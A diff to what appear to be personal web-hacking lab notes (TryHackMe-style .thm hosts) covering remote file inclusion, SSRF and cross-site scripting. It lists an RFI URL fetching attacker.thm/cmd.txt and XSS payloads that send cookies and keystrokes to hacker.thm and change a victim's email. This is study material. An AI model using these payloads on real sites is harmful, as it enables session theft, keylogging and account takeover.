@@ -93,9 +93,26 @@ http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
 xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 SSRF  (Server-Side Request Forgery)
+    Access to unauthorised areas.
+    Access to customer/organisational data.
+    Ability to Scale to internal networks.
+    Reveal authentication tokens/credentials.
+requestbin.com
+https://website.th./item/2?server=server.website.thm/flag?id=9&x=
 
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+Cross-site Scripting
 
+ XSS Payloads 
+ <script>alert('XSS');</script>
+Session Stealing:
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+Key Logger
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+Business Logic
+<script>user.changeEmail('attacker@hacker.thm');</script>
 
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 
 
